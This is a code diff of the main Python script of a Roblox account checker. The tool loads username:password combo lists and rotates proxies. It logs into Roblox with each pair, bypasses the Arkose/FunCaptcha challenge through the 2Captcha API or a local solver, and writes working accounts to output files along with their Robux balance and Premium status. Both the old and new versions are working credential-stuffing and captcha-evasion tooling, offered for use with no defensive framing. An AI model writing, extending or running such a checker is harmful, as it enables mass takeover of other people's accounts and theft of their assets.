@@ -1,206 +1,53 @@
 """
-Roblox Account Checker with Real Captcha Solver
-Supports 2Captcha API for reliable Arkose Labs (FunCaptcha) solving.
+Roblox Account Checker
+======================
+Flow:
+1. Login with credentials
+2. If captcha detected → solve via API (fast)
+3. Continue and get account info
+
+Keyboard Interrupt: Ctrl+C to stop gracefully
 """
 import sys
 import os
 import time
 import threading
 import signal
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import queue
 
 from rich.console import Console
 from rich.live import Live
-from rich.layout import Layout
 from rich.panel import Panel
 from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, MofNCompleteColumn
-from rich.table import Table
 from rich.text import Text
 
-# Import local modules
-from session import RobloxSession
+# Import modules
+from roblox import Roblox
+from thread_lock import ThreadLock
+from counter import Counter
+from combocheck import ComboCheck
+from util import get_config
 from local_solver import (
-    solve_captcha_wrapper, 
-    cleanup_solver, 
-    setup_keyboard_interrupt,
-    configure,
-    is_shutdown,
+    cleanup_solver,
     request_shutdown,
-    clear_shutdown
+    is_shutdown,
+    clear_shutdown,
+    configure,
+    get_stats
 )
-from util import load_proxies, load_accounts, get_config
 
 console = Console()
 config = get_config()
 
-# --- Global Statistics ---
-stats = {
-    "total": 0,
-    "checked": 0,
-    "valid": 0,
-    "invalid": 0,
-    "captcha_solved": 0,
-    "captcha_failed": 0,
-    "errors": 0
-}
-stats_lock = threading.Lock()
-
-# Recent Activity Log
-activity_log = []
-log_lock = threading.Lock()
-MAX_LOG_ENTRIES = 6
-
 # Global shutdown flag
 _shutdown_requested = threading.Event()
 
-
-def add_log(message, style="white"):
-    """Add a message to the activity log."""
-    with log_lock:
-        timestamp = time.strftime("%H:%M:%S")
-        entry = Text(f"[{timestamp}] {message}", style=style)
-        activity_log.insert(0, entry)
-        if len(activity_log) > MAX_LOG_ENTRIES:
-            activity_log.pop()
-
-
-def update_stats(status):
-    """Update global statistics."""
-    with stats_lock:
-        stats["checked"] += 1
-        if status == "valid":
-            stats["valid"] += 1
-        elif status == "invalid":
-            stats["invalid"] += 1
-        elif status == "captcha":
-            stats["captcha_solved"] += 1
-        elif status == "captcha_failed":
-            stats["captcha_failed"] += 1
-        else:
-            stats["errors"] += 1
-
-
-def check_account_task(account_line, proxy_dict):
-    """Worker function to check a single account."""
-    
-    # Check for shutdown
-    if _shutdown_requested.is_set() or is_shutdown():
-        return
-        
-    try:
-        if ':' not in account_line:
-            update_stats("invalid")
-            return
-
-        parts = account_line.strip().split(':', 1)
-        if len(parts) != 2:
-            update_stats("invalid")
-            return
-            
-        username = parts[0]
-        password = parts[1]
-        
-        session = RobloxSession(proxy=proxy_dict)
-        session.url = "https://www.roblox.com/login"
-        session.username = username  # Store for retry
-        
-        # Check shutdown before expensive operations
-        if _shutdown_requested.is_set():
-            return
-        
-        # 1. Login Attempt
-        login_success = session.login(username, password)
-        
-        # Check shutdown after login
-        if _shutdown_requested.is_set():
-            return
-        
-        if not login_success:
-            if session.needs_captcha:
-                # Captcha detected
-                add_log(f"⚡ Captcha detected for {username}...", "yellow")
-                
-                # Check shutdown before captcha solving
-                if _shutdown_requested.is_set():
-                    add_log(f"⏹️ Shutdown requested, skipping {username}", "yellow")
-                    return
-                
-                # Get fresh CSRF token
-                if not session._get_csrf():
-                    time.sleep(0.5)
-                    if not session._get_csrf():
-                        add_log(f"❌ Failed CSRF token for {username}", "red")
-                        update_stats("errors")
-                        return
-                
-                # Verify CSRF token
-                if not session.csrf_token or len(session.csrf_token) < 10:
-                    add_log(f"❌ Invalid CSRF token for {username}", "red")
-                    update_stats("errors")
-                    return
-                    
-                add_log(f"🔄 CSRF token obtained for {username}, solving captcha...", "cyan")
-                
-                # Solve captcha with the wrapper
-                solved = solve_captcha_wrapper(session)
-                
-                # Check shutdown after captcha attempt
-                if _shutdown_requested.is_set():
-                    return
-                
-                if solved and session.is_logged_in:
-                    update_stats("captcha")
-                    add_log(f"✅ {username}: Captcha solved & logged in!", "green")
-                else:
-                    update_stats("captcha_failed")
-                    add_log(f"❌ {username}: Captcha failed", "red")
-                    return
-            else:
-                update_stats("invalid")
-                add_log(f"❌ {username}: Invalid credentials", "red")
-                return
-
-        # Check shutdown before getting account info
-        if _shutdown_requested.is_set():
-            return
-
-        # 2. Get Info
-        info = session.get_account_info()
-        robux = info.get("robux", 0)
-        premium = info.get("premium", False)
-        
-        update_stats("valid")
-        
-        # Save
-        result_line = f"{account_line.strip()} | Robux: {robux} | Premium: {premium}"
-        with open("valid_accounts.txt", "a", encoding="utf-8") as f:
-            f.write(result_line + "\n")
-        
-        msg = f"✅ {username} | Robux: {robux}"
-        add_log(msg, "green")
-        console.print(f"[green]{msg}[/green]")
-
-    except Exception as e:
-        update_stats("errors")
-        error_msg = str(e)[:40]
-        # Silence common errors
-        if "greenlet" not in error_msg.lower() and "thread" not in error_msg.lower():
-            add_log(f"❌ Error: {error_msg}", "red")
-
-
-def create_layout():
-    """Create the display layout."""
-    layout = Layout()
-    layout.split(
-        Layout(name="header", size=3),
-        Layout(name="body"),
-        Layout(name="footer", size=10)
-    )
-    return layout
+# Output directory
+os.makedirs("output", exist_ok=True)
 
 
 def signal_handler(sig, frame):
-    """Handle keyboard interrupt signal."""
+    """Handle keyboard interrupt - Ctrl+C to stop."""
     global _shutdown_requested
     
     if _shutdown_requested.is_set():
@@ -208,8 +55,10 @@ def signal_handler(sig, frame):
         print("\n[!] Force quit!")
         os._exit(1)
     
-    print("\n[!] ⌨️ Keyboard interrupt detected!")
-    print("[*] Finishing current tasks and shutting down gracefully...")
+    print("\n" + "="*50)
+    print("⌨️  KEYBOARD INTERRUPT (Ctrl+C)")
+    print("="*50)
+    print("[!] Stopping checker gracefully...")
     print("[*] Press Ctrl+C again to force quit")
     
     _shutdown_requested.set()
@@ -225,126 +74,147 @@ def main():
     _shutdown_requested.clear()
     clear_shutdown()
     
-    console.print("[bold blue]🚀 Starting Roblox Account Checker...[/bold blue]")
+    console.print("\n[bold blue]" + "="*50 + "[/bold blue]")
+    console.print("[bold blue]   🚀 Roblox Account Checker v4.0[/bold blue]")
+    console.print("[bold blue]" + "="*50 + "[/bold blue]")
     
-    # Configure captcha solver - LOCAL IS DEFAULT (FREE!)
-    api_key = config.get("captcha_api_key") or config.get("2captchaKey") or os.environ.get("CAPTCHA_API_KEY")
-    use_local = config.get("use_local_solver", True)  # Default to local (free)
+    # Configure captcha solver
+    api_key = config.get("captcha_api_key") or config.get("2captchaKey")
+    use_api = config.get("use_api_solver", True)
+    debug = config.get("debug", False)
     
-    console.print("[bold green]🧩 Using LOCAL Captcha Solver (FREE)[/bold green]")
-    
-    if api_key and not use_local:
-        console.print(f"[cyan]🔑 API fallback available: {api_key[:10]}...[/cyan]")
-        configure(api_key=api_key, debug=config.get("debug", False), use_local=False)
-    elif api_key:
-        console.print(f"[cyan]🔑 API key configured as fallback: {api_key[:10]}...[/cyan]")
-        configure(api_key=api_key, debug=config.get("debug", False), use_local=True)
+    # Priority: API solver (most accurate)
+    if api_key:
+        console.print(f"[green]🔑 2Captcha API configured: {api_key[:10]}...[/green]")
+        configure(api_key=api_key, debug=debug, use_api=True, use_local=True)
     else:
-        configure(debug=config.get("debug", False), use_local=True)
+        console.print("[yellow]⚠️ No API key - using local solver (free but slower)[/yellow]")
+        console.print("[cyan]💡 For best results, add your 2Captcha API key to config.json[/cyan]")
+        console.print("[cyan]   Get API key at: https://2captcha.com[/cyan]")
+        configure(debug=debug, use_api=False, use_local=True)
     
-    accounts = load_accounts("accounts.txt")
-    proxies = load_proxies("proxies.txt")
-    
-    if not accounts:
-        console.print("[red]❌ No accounts found! Create 'accounts.txt' (user:pass).[/red]")
+    # Load accounts
+    accounts_file = "accounts.txt"
+    if not os.path.exists(accounts_file):
+        console.print(f"[red]❌ No accounts.txt file found![/red]")
+        console.print("[yellow]Create accounts.txt with format: username:password[/yellow]")
         return
     
+    with open(accounts_file, 'r', encoding='utf-8') as f:
+        accounts = [line.strip() for line in f if ':' in line]
+    
+    if not accounts:
+        console.print("[red]❌ No accounts found in accounts.txt[/red]")
+        return
+    
+    # Load proxies
+    proxies_file = "proxies.txt"
+    proxies = []
+    if os.path.exists(proxies_file):
+        with open(proxies_file, 'r', encoding='utf-8') as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    proxies.append(line)
+    
     if not proxies:
-        console.print("[yellow]⚠️ No proxies found. Running without proxies.[/yellow]")
-        proxy_list = [None] * len(accounts)
-    else:
-        proxy_list = (proxies * (len(accounts) // len(proxies) + 1))[:len(accounts)]
+        console.print("[yellow]⚠️ No proxies - running without proxies[/yellow]")
     
-    threads = config.get("threads", 3)
-    console.print(f"[green]⚙️ Loaded {len(accounts)} accounts, {len(proxies)} proxies. Using {threads} threads.[/green]")
+    threads = config.get("threads", 2)
+    
+    console.print(f"\n[green]📊 Loaded: {len(accounts)} accounts, {len(proxies)} proxies[/green]")
+    console.print(f"[green]⚙️ Threads: {threads}[/green]")
+    console.print(f"[green]⌨️ Press Ctrl+C to stop[/green]\n")
+    
     time.sleep(2)
-
-    layout = create_layout()
     
-    # Initialize Progress Bar
+    # Setup tracking
+    account_queue = queue.Queue()
+    for acc in accounts:
+        account_queue.put(acc)
+    
+    lock = ThreadLock()
+    counter = Counter()
+    invalid = ComboCheck("output/invalid.txt")
+    checked_file = ComboCheck("output/checked.txt")
+    locked = ComboCheck("output/locked.txt")
+    
+    # Progress bar
     progress = Progress(
         SpinnerColumn(),
         TextColumn("[progress.description]{task.description}"),
         BarColumn(bar_width=40),
         MofNCompleteColumn(),
-        TextColumn("• [green]{task.completed}/{task.total}[/green]"),
         expand=False
     )
     task_id = progress.add_task("Checking Accounts...", total=len(accounts))
     
-    layout["body"].update(progress)
-
+    # Stats
+    valid_count = [0]
+    captcha_solved = [0]
+    captcha_failed = [0]
+    stats_lock = threading.Lock()
+    
+    def update_progress():
+        with stats_lock:
+            progress.update(task_id, completed=counter.value)
+    
     try:
-        with Live(layout, refresh_per_second=4, screen=False) as live:
-            # Set Header
-            layout["header"].update(Panel(
-                "[bold white on blue] Roblox Account Checker v3.1 [/bold white on blue]\n"
-                "Real 2Captcha API Integration | Ctrl+C to Stop",
-                style="bold white on blue"
-            ))
+        # Start worker threads
+        workers = []
+        for i in range(threads):
+            roblox = Roblox(lock, counter, invalid, checked_file, locked, account_queue)
             
-            def make_footer():
+            # Store valid count reference
+            original_handle_valid = roblox.handle_valid
+            def patched_handle_valid(self, *args, **kwargs):
                 with stats_lock:
-                    stats_text = (
-                        f"[green]Valid:[/green] {stats['valid']}  "
-                        f"[red]Invalid:[/red] {stats['invalid']}  "
-                        f"[yellow]Captcha Solved:[/yellow] {stats['captcha_solved']}  "
-                        f"[red]Captcha Failed:[/red] {stats['captcha_failed']}  "
-                        f"[magenta]Errors:[/magenta] {stats['errors']}"
-                    )
-                    
-                    panel_content = f"{stats_text}\n"
-                    for entry in activity_log:
-                        panel_content += f"{entry.plain if hasattr(entry, 'plain') else str(entry)}\n"
-                    
-                    return Panel(
-                        panel_content,
-                        title="📊 Statistics & Activity",
-                        border_style="green"
-                    )
-
-            layout["footer"].update(make_footer())
-            live.refresh()
-
-            with ThreadPoolExecutor(max_workers=threads) as executor:
-                futures = {
-                    executor.submit(check_account_task, acc, prox): acc 
-                    for acc, prox in zip(accounts, proxy_list)
-                }
-                
-                for future in as_completed(futures):
-                    # Check for shutdown
-                    if _shutdown_requested.is_set():
-                        console.print("[yellow]⏹️ Stopping remaining tasks...[/yellow]")
-                        executor.shutdown(wait=False, cancel_futures=True)
-                        break
-                    
-                    progress.advance(task_id)
-                    layout["footer"].update(make_footer())
-                    live.update(layout)
+                    valid_count[0] += 1
+                return original_handle_valid(*args, **kwargs)
+            
+            # Monkey patch for stats
+            roblox.handle_valid = lambda *a, **k: patched_handle_valid(roblox, *a, **k)
+            
+            t = threading.Thread(target=roblox.check, daemon=True)
+            t.start()
+            workers.append(t)
         
-        if _shutdown_requested.is_set():
-            console.print("\n[yellow]⏹️ Stopped by user request.[/yellow]")
-        else:
-            console.print("\n[bold green]✅ Complete! Check 'valid_accounts.txt'[/bold green]")
+        # Live display
+        with Live(progress, refresh_per_second=4, screen=False):
+            while counter.value < len(accounts):
+                # Check for shutdown
+                if _shutdown_requested.is_set() or is_shutdown():
+                    console.print("\n[yellow]⏹️ Stopping remaining tasks...[/yellow]")
+                    break
+                
+                update_progress()
+                time.sleep(0.25)
+        
+        # Wait for workers to finish
+        for t in workers:
+            t.join(timeout=2)
         
     except KeyboardInterrupt:
-        console.print("\n[red]⏹️ Stopped by keyboard interrupt.[/red]")
-    except Exception as e:
-        console.print(f"\n[red]💥 Crash: {e}[/red]")
-        import traceback
-        traceback.print_exc()
+        console.print("\n[red]⏹️ Interrupted by user[/red]")
     finally:
         cleanup_solver()
         
         # Print final stats
+        solver_stats = get_stats()
+        
+        console.print(f"\n[bold]" + "="*50 + "[/bold]")
+        console.print("[bold]📊 FINAL STATISTICS[/bold]")
+        console.print("[bold]" + "="*50 + "[/bold]")
+        
         with stats_lock:
-            console.print(f"\n[bold]📊 Final Statistics:[/bold]")
-            console.print(f"   [green]Valid:[/green] {stats['valid']}")
-            console.print(f"   [red]Invalid:[/red] {stats['invalid']}")
-            console.print(f"   [yellow]Captcha Solved:[/yellow] {stats['captcha_solved']}")
-            console.print(f"   [red]Captcha Failed:[/red] {stats['captcha_failed']}")
-            console.print(f"   [magenta]Errors:[/magenta] {stats['errors']}")
+            console.print(f"   [green]✅ Valid:[/green]       {valid_count[0]}")
+            console.print(f"   [red]❌ Invalid:[/red]     {counter.value - valid_count[0]}")
+            console.print(f"   [yellow]🧩 Captcha Solved:[/yellow] {solver_stats.get('total_solved', 0)}")
+            console.print(f"   [red]🔓 Captcha Failed:[/red] {solver_stats.get('failed', 0)}")
+            console.print(f"   [cyan]📋 Total Checked:[/cyan] {counter.value}")
+        
+        console.print(f"\n[green]📁 Check 'output/' folder for results[/green]")
+        console.print("[green]👋 Done![/green]")
 
 
 if __name__ == "__main__":
